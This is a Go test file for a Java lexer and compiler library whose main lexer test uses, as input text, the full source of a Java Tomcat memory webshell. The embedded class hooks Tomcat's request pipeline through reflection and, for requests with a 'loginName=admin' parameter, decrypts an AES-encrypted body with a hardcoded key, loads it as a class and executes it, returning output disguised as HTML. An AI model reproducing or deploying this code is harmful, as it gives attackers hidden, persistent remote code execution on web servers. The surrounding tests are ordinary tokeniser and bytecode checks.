package compiler

import (
	"fmt"
	"github.com/Yyjccc/GoJavassist/classfile"
	"github.com/Yyjccc/GoJavassist/compiler/reflect"

	"io/ioutil"
	"testing"
	"time"
)

func TestLexer(t *testing.T) {
	code := `package com.example.tomcatshell;





import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class DunnWallace extends ClassLoader implements InvocationHandler {
	private Class payload;
	private Object oldValve = null;

	public DunnWallace() {
	}

	public DunnWallace(ClassLoader var1) {
		super(var1);
	}

	public static void setFieldValue(Object var0, String var1, Object var2) throws java.lang.Exception {
		Field var3 = getField(var0, var1);
		var3.setAccessible(true);
		var3.set(var0, var2);
	}

	public static Object invokeMethod(Object var0, String var1, Object[] var2) {
		try {
			ArrayList var3 = new ArrayList();
			if (var2 != null) {
				for(int var4 = 0; var4 < var2.length; ++var4) {
					Object var5 = var2[var4];
					if (var5 != null) {
						var3.add(var5.getClass());
					} else {
						var3.add((Object)null);
					}
				}
			}

			Method var7 = getMethodByClass(var0.getClass(), var1, (Class[])var3.toArray(new Class[0]));
			return var7.invoke(var0, var2);
		} catch (java.lang.Exception var6) {
			return null;
		}
	}

	public Object invokeMethod(Object var1, String var2, Class[] var3, Object[] var4) {
		Object var5 = null;

		try {
			Method var6 = var1.getClass().getMethod(var2, var3);
			if (!var6.isAccessible()) {
				var6.setAccessible(true);
			}

			var5 = var6.invoke(var1, var4);
		} catch (Throwable var7) {
		}

		return var5;
	}

	public String getRequestURI(Object var1) {
		return (String)this.invokeMethod(var1, "getRequestURI", new Class[0], new Object[0]);
	}

	public String getParameter(Object var1, String var2) {
		return (String)this.invokeMethod(var1, "getParameter", new Class[]{String.class}, new Object[]{var2});
	}

	public String getHeader(Object var1, String var2) {
		return (String)this.invokeMethod(var1, "getHeader", new Class[]{String.class}, new Object[]{var2});
	}

	public String getCookie(Object var1, String var2) {
		Object var3 = this.invokeMethod(var1, "getCookie", new Class[0], new Object[0]);
		String var4 = null;
		if (var3 != null) {
			int var5 = Array.getLength(var3);

			for(int var6 = 0; var6 < var5; ++var6) {
				Object var7 = Array.get(var3, var6);
				String var8 = (String)this.invokeMethod(var7, "getName", new Class[0], new Object[0]);
				if (var2.equals(var8)) {
					var4 = (String)this.invokeMethod(var7, "getValue", new Class[0], new Object[0]);
					break;
				}
			}
		}

		return var4;
	}

	public String getQueryString(Object var1) {
		return (String)this.invokeMethod(var1, "getQueryString", new Class[0], new Object[0]);
	}

	public InputStream getInputStream(Object var1) {
		return (InputStream)this.invokeMethod(var1, "getInputStream", new Class[0], new Object[0]);
	}

	public OutputStream getOutputStream(Object var1) {
		return (OutputStream)this.invokeMethod(var1, "getOutputStream", new Class[0], new Object[0]);
	}

	public void setHeader(Object var1, String var2, String var3) {
		this.invokeMethod(var1, "setHeader", new Class[]{String.class, String.class}, new Object[]{var2, var3});
	}

	public void addHeader(Object var1, String var2, String var3) {
		this.invokeMethod(var1, "addHeader", new Class[]{String.class, String.class}, new Object[]{var2, var3});
	}

	public void setStatus(Object var1, int var2) {
		this.invokeMethod(var1, "setStatus", new Class[]{Integer.TYPE}, new Object[]{var2});
	}

	public void addCookie(Object var1, String var2, String var3) {
		this.addHeader(var1, "Set-Cookie", var2 + "=" + URLEncoder.encode(var3) + "; path=/");
	}

	public static Method getMethodByClass(Class var0, String var1, Class... var2) {
		Method var3 = null;

		while(var0 != null) {
			try {
				var3 = var0.getDeclaredMethod(var1, var2);
				var0 = null;
			} catch (java.lang.Exception var5) {
				var0 = var0.getSuperclass();
			}
		}

		if (var3 != null) {
			var3.setAccessible(true);
		}

		return var3;
	}

	public static Object getFieldValue(Object var0, String var1) {
		try {
			return getField(var0, var1).get(var0 instanceof Class ? null : var0);
		} catch (java.lang.Exception var3) {
			return null;
		}
	}

	public static Field getField(Object var0, String var1) {
		if (var0 != null) {
			Class var2 = null;
			if (var0 instanceof Class) {
				var2 = (Class)var0;
			} else {
				var2 = var0.getClass();
			}

			while(var2 != null) {
				try {
					Field var3 = var2.getDeclaredField(var1);
					var3.setAccessible(true);
					return var3;
				} catch (java.lang.Exception var4) {
					var2 = var2.getSuperclass();
				}
			}
		}

		return null;
	}

	public static Object getService() throws java.lang.Exception {
		Thread[] var2 = (Thread[])getFieldValue(Thread.currentThread().getThreadGroup(), "threads");

		for(int var3 = 0; var3 < var2.length; ++var3) {
			Thread var4 = var2[var3];
			if (var4 != null) {
				String var1 = var4.getName();
				if (!var1.contains("exec") && var1.contains("http")) {
					Object var0 = getFieldValue(var4, "target");
					if (var0 instanceof Runnable) {
						try {
							var0 = getFieldValue(getFieldValue(getFieldValue(var0, "this$0"), "handler"), "global");
						} catch (java.lang.Exception var13) {
							continue;
						}

						List var5 = (List)getFieldValue(var0, "processors");

						for(int var6 = 0; var6 < var5.size(); ++var6) {
							Object var7 = var5.get(var6);
							var0 = getFieldValue(var7, "req");
							if (var0 != null) {
								Object var8 = getFieldValue(var0, "notes");
								int var9 = Array.getLength(var8);

								for(int var10 = 0; var10 < var9; ++var10) {
									Object var11 = Array.get(var8, var10);
									if (var11 != null) {
										Object var12 = getFieldValue(getFieldValue(var11, "connector"), "service");
										if (var12 != null) {
											return var12;
										}
									}
								}
							}
						}
					}
				}
			}
		}

		return null;
	}

	public static void inject(Object var0) throws java.lang.Exception {
		if (var0 != null) {
			Object var1 = getFieldValue(var0, "container");
			if (var1 == null) {
				var1 = getFieldValue(var0, "engine");
			}

			Object var2 = invokeMethod(var1, "getPipeline", new Object[0]);
			ClassLoader var3 = var2.getClass().getClassLoader();
			Class var4 = var3.loadClass("org.apache.catalina.Valve");
			Object var5 = getFieldValue(var2, "basic");
			if (var4.isAssignableFrom(var5.getClass())) {
				DunnWallace var6 = new DunnWallace();
				var6.oldValve = var5;
				Object var7 = Proxy.newProxyInstance(var3, new Class[]{var4}, var6);
				setFieldValue(var2, "basic", var7);
			}
		}

	}

	public static byte[] unHex(byte[] var0) {
		int var1 = var0.length;
		byte[] var2 = new byte[var1 / 2];
		int var3 = 0;

		for(int var4 = 0; var4 < var1; ++var3) {
			int var5 = Character.digit(var0[var4++], 16) << 4;
			var5 |= Character.digit(var0[var4++], 16);
			var2[var3] = (byte)(var5 & 255);
		}

		return var2;
	}

	public byte[] aes128(byte[] var1, int var2) {
		try {
			Cipher var3 = Cipher.getInstance("AES");
			var3.init(var2, new SecretKeySpec(base64Decode("q3IDVNjjZgQMoOL8p9xGVw==".getBytes()), "AES"));
			return var3.doFinal(var1);
		} catch (java.lang.Exception var4) {
			return null;
		}
	}

	public static byte[] base64Encode(byte[] var0) {
		byte[] var2 = null;

		Class var1;
		try {
			var1 = Class.forName("java.util.Base64");
			Object var3 = var1.getMethod("getEncoder", (Class[])null).invoke(var1, (Object[])null);
			var2 = (byte[])var3.getClass().getMethod("encode", byte[].class).invoke(var3, var0);
		} catch (java.lang.Exception var6) {
			try {
				var1 = Class.forName("sun.misc.BASE64Encoder");
				Object var4 = var1.newInstance();
				var2 = ((String)var4.getClass().getMethod("encode", byte[].class).invoke(var4, var0)).getBytes();
			} catch (java.lang.Exception var5) {
			}
		}

		return var2;
	}

	public static byte[] base64Decode(byte[] var0) {
		byte[] var2 = null;

		Class var1;
		try {
			var1 = Class.forName("java.util.Base64");
			Object var3 = var1.getMethod("getDecoder", (Class[])null).invoke(var1, (Object[])null);
			var2 = (byte[])var3.getClass().getMethod("decode", byte[].class).invoke(var3, var0);
		} catch (java.lang.Exception var6) {
			try {
				var1 = Class.forName("sun.misc.BASE64Decoder");
				Object var4 = var1.newInstance();
				var2 = (byte[])var4.getClass().getMethod("decodeBuffer", String.class).invoke(var4, new String(var0));
			} catch (java.lang.Exception var5) {
			}
		}

		return var2;
	}

	public Object invoke(Object var1, Method var2, Object[] var3) throws Throwable {
		if ("invoke".equals(var2.getName())) {
			try {
				Object var4 = var3[0];
				Object var5 = var3[1];
				if ("admin".equals(this.getParameter(var4, "loginName"))) {
					byte[] var6 = new byte[102400];
					ByteArrayOutputStream var7 = new ByteArrayOutputStream();
					InputStream var8 = this.getInputStream(var4);
					boolean var9 = false;

					int var16;
					while((var16 = var8.read(var6)) > 0) {
						var7.write(var6, 0, var16);
					}

					byte[] var10 = var7.toByteArray();
					var10 = unHex(var10);
					var10 = this.aes128(var10, 2);
					if (var10 == null || var10.length == 0) {
						throw new Runtimejava.lang.Exception();
					}

					if (this.payload != null) {
						ByteArrayOutputStream var11 = new ByteArrayOutputStream();
						Object var12 = this.payload.newInstance();
						var12.equals(var4);
						var12.equals(var11);
						var12.equals(var10);
						var12.toString();
						byte[] var13 = var11.toByteArray();
						if (var13.length == 0) {
							throw new Runtimejava.lang.Exception();
						}

						var11.reset();
						Method var14 = getMethodByClass(var5.getClass(), "setSuspended", Boolean.TYPE);
						if (var14 != null) {
							var14.invoke(var5, false);
						}

						var13 = base64Encode(var13);
						var11.write(base64Decode("PGh0bWw+".getBytes()));
						var11.write(var13);
						var11.write(base64Decode("PC9odG1sPg==".getBytes()));
						var13 = var11.toByteArray();
						this.setStatus(var5, 200);
						this.setHeader(var5, "Content-Type", "text/html;charset=utf-8");
						this.getOutputStream(var5).write(var13);
						return null;
					}

					this.payload = (new DunnWallace(this.getClass().getClassLoader())).defineClass(var10, 0, var10.length);
				}
			} catch (Throwable var15) {
				return var2.invoke(this.oldValve, var3);
			}
		}

		return var2.invoke(this.oldValve, var3);
	}

	static {
		boolean var0 = false;

		Class var1;
		try {
			var1 = Class.forName("org.apache.catalina.startup.Bootstrap");
			Object var2 = getFieldValue(getFieldValue(getFieldValue(getFieldValue(var1, "daemon"), "catalinaDaemon"), "server"), "services");
			int var3 = Array.getLength(var2);

			for(int var4 = 0; var4 < var3; ++var4) {
				Object var5 = Array.get(var2, var4);
				if (var5 != null) {
					inject(var5);
					var0 = true;
				}
			}
		} catch (Throwable var7) {
		}

		if (!var0) {
			var1 = null;

			try {
				Object var8 = getService();
				inject(var8);
			} catch (Throwable var6) {
			}
		}

	}
}
`
	var tokens = make([]Token, 0)
	lexer := NewLexer(code)
	start := time.Now()
	for lexer.HasNextToken() {
		token := lexer.NextToken()
		tokens = append(tokens, token)
		fmt.Printf("%v\n", token)
		//time.Sleep(100 * time.Millisecond)
	}
	fmt.Printf("coast %v \n", time.Now().Sub(start))
}

func TestReadString(t *testing.T) {
	code := `"hello world"`
	lexer := NewLexer(code)
	var tokens = make([]Token, 0)

	for lexer.HasNextToken() {
		token := lexer.NextToken()
		tokens = append(tokens, token)
		fmt.Printf("%v\n", token)
	}
	fmt.Printf("%v\n", tokens)

}

func TestParserDecl(t *testing.T) {
	code := `public static byte[] base64Decode(byte[] var0) {
		byte[] var2 = null;
		Class var1;
		try {
			var1 = Class.forName("java.util.Base64");
			Object var3 = var1.getMethod("getDecoder", (Class[])null).invoke(var1, (Object[])null);
			var2 = (byte[])var3.getClass().getMethod("decode", byte[].class).invoke(var3, var0);
		} catch (java.lang.Exception var6) {
			try {
				var1 = Class.forName("sun.misc.BASE64Decoder");
				Object var4 = var1.newInstance();
				var2 = (byte[])var4.getClass().getMethod("decodeBuffer", String.class).invoke(var4, new String(var0));
			} catch (java.lang.Exception var5) {

			}
		}

		return var2;
	}`
	lexer := NewLexer(code)
	var tokens = make([]Token, 0)
	for lexer.HasNextToken() {
		token := lexer.NextToken()
		tokens = append(tokens, token)
	}
	compiler := NewJCompiler(nil)
	err := compiler.compile(code)

	if err != nil {
		fmt.Println(err.Error())
		return
	}
	data := compiler.gen.bytecodes.codes

	fmt.Printf("data (%d bytes):\n", len(data))
	fmt.Printf("% x\n", data)
}

func TestLoad(t *testing.T) {
	class := reflect.ClassForName("[B")
	if class == nil {
		fmt.Println("class not found")
	}
	strClass := reflect.DefaultPool.Get("java.lang.String")
	if strClass == nil {
		fmt.Println("class not found")
	}
	ctClass, err := reflect.MakeClass("aaa")
	if err != nil {
		fmt.Println(err.Error())
	}
	fmt.Println(ctClass)
}

func TestCompileMethod(t *testing.T) {
	code := `public static byte[] base64Decode(byte[] var0) { 
		byte[] var2 = null;
		Class var1; 
		try { 
			var1 = java.lang.Class.forName("java.util.Base64");
			Object var3 = var1.getMethod("getDecoder",new java.lang.Class[]{}).invoke(var1, new java.lang.Object[]{});
			var2 = (byte[])var3.getClass().getMethod("decode", new java.lang.Class[]{ byte[].class }).invoke(var3,new java.lang.Object[]{var0});
		} catch (java.lang.Exception var6) {
			try { 
				var1 = Class.forName("sun.misc.BASE64Decoder");
				Object var4 = var1.newInstance();
				var2 = (byte[])var4.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(var4, new java.lang.Object[]{new java.lang.String(var0)});
			} catch (java.lang.Exception var5) {
			}
		} 
		return var2;
	}
`
	class, err := reflect.MakeClass("ch.qos.logback.classic.Logger")
	if err != nil {
		return
	}
	method, err := CompileMethod(class, code)
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	class.AddMethod(method)
	data := class.ToClassFile().ToByteCode()
	fmt.Printf("data (%d bytes):\n", len(data))
	fmt.Printf("% x\n", data)
	cf, err := classfile.Parse(data)
	if err != nil {
		return
	}
	fmt.Printf("%x\n", cf)
	//c := bytecode.NewClass(cf)
	//fmt.Println(c)
	ioutil.WriteFile("test.class", data, 0644)
}
